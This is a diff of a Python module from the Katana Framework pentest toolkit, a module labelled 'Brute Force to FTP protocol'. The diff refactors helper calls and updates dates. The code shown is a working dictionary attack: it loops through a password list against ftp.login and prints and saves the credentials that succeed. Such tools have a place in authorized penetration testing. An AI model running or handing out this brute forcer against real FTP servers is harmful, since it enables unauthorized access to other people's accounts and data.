@@ -3,11 +3,10 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES
-from core.Function import isLive,saveRegister
 from ftplib import FTP
 # END LIBRARIES
 
@@ -18,7 +17,7 @@ def init():
 	init.Description        ="Brute Force to FTP protocol."
 	init.CodeName           ="btf/pr.ftp"
 	init.DateCreation       ="07/03/2015"      
-	init.LastModification   ="24/05/2016"
+	init.LastModification   ="27/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -36,7 +35,7 @@ def init():
 
 # CODE MODULE    ############################################################################################
 def main(run):
-	isLive(init.var['target'],init.var['port'])
+	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
 	Loadingfile(init.var['dict'])
 
 	ftp = FTP()
@@ -48,10 +47,10 @@ def main(run):
 			try:
 				ftp.login(init.var['user'],password)
 				if True:
-					printAlert(3,"Successfully with ["+init.var['user']+"]["+password+"]\n")
+					printk.suff("Successfully with ["+init.var['user']+"]["+password+"]\n")
 					Space()
-					saveRegister(init,password)
+					UTIL.Register(init,password)
 					return
-			except:printAlert(0," | Checking '"+password+"'")
+			except:printk.inf(" | Checking '"+password+"'")
 
 # END CODE MODULE ############################################################################################
